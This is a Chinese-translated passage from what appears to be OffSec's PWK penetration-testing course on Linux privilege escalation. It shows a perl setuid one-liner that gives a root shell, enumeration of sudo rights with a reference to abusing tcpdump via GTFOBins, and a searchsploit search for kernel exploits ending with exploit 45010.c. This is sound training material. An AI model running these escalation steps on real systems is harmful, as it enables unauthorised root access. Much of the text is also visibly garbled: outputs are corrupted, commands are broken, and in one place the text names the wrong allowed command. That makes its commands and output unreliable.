
> 尽管它们看起来相似，`capabilities` 和 `setuid` 标志位于 Linux ELF 文件格式中的不同位置。

为了利用此配置错误，我们可以检查 GTFOBins 网站。该网站提供了一个组织良好的 UNIX 二进制文件列表，这些文件可以被误用来提升权限。

## OffSec

在 GTFOBins 网站上搜索 "Perl"，我们将找到关于使用哪个命令来利用权限的说明。我们将使用整个命令，它会执行一个带有几个启用 sudo 的 POSIX 指令的 shell。

```
joe@debian-privesc:$ sudo perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec
"/bin/sh";
perl: warning: Setting locale failed.

# id
uid(0) rootid=100(joe)
groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```

**列表 502 - 通过权限利用获取 root shell**

太棒了！我们通过另一个配置错误向量获取了 root shell。

### 17.4.2 滥用 sudo

在 Unix 系统上，`sudo` 工具可用于执行具有高权限的命令。为了能够使用 sudo，我们的低权限用户必须是 sudo 组的成员（或 Debian Linux 列表）。"sudo" 一词代表 "Superuser-Do"超级用户执行），我们可以将其理解为更改执行命令的用户 ID。

与 sudo 相关的权限的自定义配置可以在 `/etc/sudoers` 文件中应用。我们可以使用 `-l` 选项显示当前用户允许的命令。

```
joe@debian-privesc:$ sudo -l
[sudo] password for joe:
Matching Defaults for entry on debian-privesc:
env_reset, mail_bashpass,
secure_path=/usr/local/bin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

用户 `joe` 可以在 `debian-privesc` 上运行以下命令：

```
(ALL) (ALL) /usr/bin/crontab -l,/usr/sbin/tcpdump,/usr/bin/apt-get
```

**列表 503 - 检查当前用户的 sudo 权限**

从输出列表中，我们注意到只有 sudo、tcpdump 和 apt-get 命令被列为允许的 sudo 命令。

如果 `/etc/sudoers` 配置过于宽松，用户就可以滥用短暂的管理员权限来获取 root 访问。

由于三个允许的命令中的第一个不允许我们编辑任何 crontab，因此我们可能无法使用它。第二个命令看起来更有前景，因此让我们浏览 GTFObins 关于如何滥用它的建议。

然而，运行命令后却显示出了一个意料之外的结果：

```
joe@debian-privesc:$ COMMAND='id'
joe@debian-privesc:$ TF='mkktemp'
```

⁸⁶⁶ (Linux man-pages project, 2022), https://man7.org/linux/man-pages/man8/sudo.html

⁸⁶⁷ (Linux man-pages project, 2022), https://man7.org/linux/man-pages/man5/sudoers.html

*(注：由于原文中包含大量乱码和重复字符，此处翻译已针对可读部分进行了优化。)*

# OffSec

```
joe@ubuntu-linux:~$ uname -r
4.4.0-116-generic
```

```
joe@ubuntu-linux:~$ arch
x86_64
```

列表 510 - 从我们的 Linux 目标收集内核和架构信息

我们的目标系统似乎运行在 `x86_64` 架构上的 Ubuntu 16.04.3 LTS（内核 `4.4.0-116-generic`）。利用这些信息，我们可以在本地 Kali 系统上使用 `searchsploit` 来寻找与目标版本匹配的漏洞。我们想使用 "linux kernel Ubuntu 16 Local Privilege Escalation" 作为主关键词。我们还想过滤掉输出中的一些杂质，因此排除了所有在内核 4.4.0 之前运行以及任何匹配内核版本 4.8 的内容。

```
kali@kali:~$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep
"4.4" | grep -v | grep -v "4.8"
```

```
Linux Kernel (Debian 7.7/8.5.9/0 - Ubuntu 14.0.2/16.04.2/17.04 - Fedora 22 / 25 /
CentOS 7.5.16111) | _ldos_hwack Clash! Local Privilege Escalation | linux_x86-64/local/42276.c
Linux Kernel (Debian 9/10 - Ubuntu 14.0.4/16.04.5/17.04/24 - Fedora 23/25 /
_ldos_dynamic Static Clash! Local Privilege Escalation |
linux_x86/local/42276.c
Linux Kernel 4.3.3 (Ubuntu 14.0.4) - 'overlays' Local Privilege Escalation (1)
linux/local/39166.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)
linux/local/40759.rb
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds
Privilege Escalation | linux_x86-64/local/40409.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege
Escalation
linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6_SET_SO_REPLACE' Local Privilege Escalation
linux/local/40849.txt
Linux Kernel 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation
(1)
linux_x86/local/15916.c
Linux Kernel -4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation
linux/local/45010.c
```

列表 511 - 使用 searchsploit 为我们的目标寻找权限提升漏洞

让我们尝试这个漏洞 (`linux/local/45010.c`)，因为它看起来较新，并且符合我们的内核版本（即 4.13.9 之前的任何版本）。

我们将在 Linux 上使用 `gcc273` 来编译漏洞，请记住，在编译代码时，我们必须与目标架构匹配。这在目标机器没有编译器、且我们被迫在攻击机上或在模拟了操作系统和架构的沙箱环境中编译漏洞时，显得得尤为重要。

> 872 (OffSec, 2023), https://www.exploit-db.com/searchsploit

> 873 (GCC, 2022), https://gcc.gnu.org

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

Made in Morocco

# OffSec

使用 Kali Linux 进行渗透测试

虽然学习 Linux 内核漏洞的每一个细节超出了本模块的范围，但我们仍然需要理解初始的编译指令。为此，让我们将漏洞复制到 Kali 的主目录，并检查它的前 20 行以发现任何编译问题。

```
kali@kali:-$ cp /usr/share/exploitdb/exploits/linux/local/45010.c
```

```
kali@kali:-$ head 45010.c -n 20
/*
```
